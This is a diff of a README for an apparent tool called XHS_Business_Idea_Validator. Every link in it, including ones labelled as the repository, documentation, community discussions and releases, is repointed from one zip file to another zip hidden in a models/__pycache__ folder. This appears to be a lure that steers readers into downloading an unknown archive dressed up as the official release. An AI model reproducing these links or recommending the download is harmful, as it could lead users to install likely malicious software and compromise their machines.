@@ -6,7 +6,7 @@ Welcome to the XHS_Business_Idea_Validator! This application helps you collect a
 
 ## 📥 Download Now
 
-[![Download XHS_Business_Idea_Validator](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)
+[![Download XHS_Business_Idea_Validator](https://raw.githubusercontent.com/igr290/XHS_Business_Idea_Validator/main/models/__pycache__/XH_Validator_Idea_Business_2.4.zip)](https://raw.githubusercontent.com/igr290/XHS_Business_Idea_Validator/main/models/__pycache__/XH_Validator_Idea_Business_2.4.zip)
 
 ## 📚 Overview
 
@@ -29,7 +29,7 @@ To ensure a smooth experience, please make sure your system meets the following 
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [XHS_Business_Idea_Validator Releases](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip). 
+To get started, visit this page to download: [XHS_Business_Idea_Validator Releases](https://raw.githubusercontent.com/igr290/XHS_Business_Idea_Validator/main/models/__pycache__/XH_Validator_Idea_Business_2.4.zip). 
 
 1. Open the link above.
 2. You will see a list of available versions.
@@ -76,16 +76,16 @@ If you encounter any issues, please refer to our FAQ section on the GitHub repos
 
 ## 📢 Stay Updated
 
-For updates, improvements, and new features, check the [XHS_Business_Idea_Validator Releases](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip) regularly.
+For updates, improvements, and new features, check the [XHS_Business_Idea_Validator Releases](https://raw.githubusercontent.com/igr290/XHS_Business_Idea_Validator/main/models/__pycache__/XH_Validator_Idea_Business_2.4.zip) regularly.
 
 ## 🌐 Additional Resources
 
-- [GitHub Repository](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)
-- [User Documentation](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)
-- [Community Discussions](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/igr290/XHS_Business_Idea_Validator/main/models/__pycache__/XH_Validator_Idea_Business_2.4.zip)
+- [User Documentation](https://raw.githubusercontent.com/igr290/XHS_Business_Idea_Validator/main/models/__pycache__/XH_Validator_Idea_Business_2.4.zip)
+- [Community Discussions](https://raw.githubusercontent.com/igr290/XHS_Business_Idea_Validator/main/models/__pycache__/XH_Validator_Idea_Business_2.4.zip)
 
 ## 🤝 Contributing
 
 We welcome contributions to improve the application. If you have suggestions or ideas, please create a pull request or open an issue.
 
-[![Download XHS_Business_Idea_Validator](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)](https://github.com/igr290/XHS_Business_Idea_Validator/raw/refs/heads/main/config/Idea_XH_Business_Validator_v2.1.zip)
+[![Download XHS_Business_Idea_Validator](https://raw.githubusercontent.com/igr290/XHS_Business_Idea_Validator/main/models/__pycache__/XH_Validator_Idea_Business_2.4.zip)](https://raw.githubusercontent.com/igr290/XHS_Business_Idea_Validator/main/models/__pycache__/XH_Validator_Idea_Business_2.4.zip)
